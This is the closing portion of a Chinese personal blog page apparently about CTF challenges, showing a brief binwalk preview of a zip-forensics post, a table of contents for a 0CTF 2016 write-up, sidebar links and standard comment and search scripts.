城邦：压缩术前期准备：010打开发现里面有很多压缩包和文件，用foremost分离 1234567891011121314151617181920212223242526272829zsh: corrupt history file /home/kali/.zsh_history┌──(kali㉿kali)-[~/Desktop]└─$ binwalk compression-magic.zipDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             Zip archive data, encrypted at least v2.0 to extract, compressed size: 417, uncompressed size: 516, name: bkcra...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">John Doe</div><div class="author-info-description">不要放弃自由去选择保障，到头来你两者都得不到</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">121</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/你的GitHub用户名"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/2829750658t-svg" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/2501_93165324?type=blog" target="_blank" title="CSDN"><i class="fas fa-blog" style="color: #fc5531;"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=1761301549" target="_blank" title="NetEaseCloud"><i class="fas fa-music" style="color: #c20c0c;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">1.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1"><span class="toc-number">2.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">构造思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9nickname%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-number">3.1.1.</span> <span class="toc-text">对nickname的构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.2.</span> <span class="toc-text">解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">3.2.1.</span> <span class="toc-text"></span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/%E5%85%A8%E7%AB%99%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95/" title="全站更新记录">全站更新记录</a><time datetime="2026-06-22T13:33:29.000Z" title="Created 2026-06-22 21:33:29">2026-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" title="我的第一篇博客">我的第一篇博客</a><time datetime="2026-06-22T13:33:29.000Z" title="Created 2026-06-22 21:33:29">2026-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/linux/%E9%9F%A9%E9%A1%BA%E5%B9%B3linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="韩顺平linux学习笔记">韩顺平linux学习笔记</a><time datetime="2026-06-22T13:08:37.000Z" title="Created 2026-06-22 21:08:37">2026-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/linux/%E9%BB%91%E9%A9%AClinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="黑马linux学习笔记">黑马linux学习笔记</a><time datetime="2026-06-22T13:08:12.000Z" title="Created 2026-06-22 21:08:12">2026-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/ctf%E9%A2%98%E8%A7%A3/web/NewStar%20CTF%202025%20Week3-who'ssti/" title="NewStar CTF 2025 Week3-who'ssti">NewStar CTF 2025 Week3-who'ssti</a><time datetime="2026-06-22T13:06:29.000Z" title="Created 2026-06-22 21:06:29">2026-06-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By John Doe</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5</a></span></div><div class="footer_custom_text"><a href="https://beian.miit.gov.cn/" target="_blank">浙ICP备2026034087号</a>
+</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo-blog-kappa.vercel.app',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://twikoo-blog-kappa.vercel.app',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo@1.7.11/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
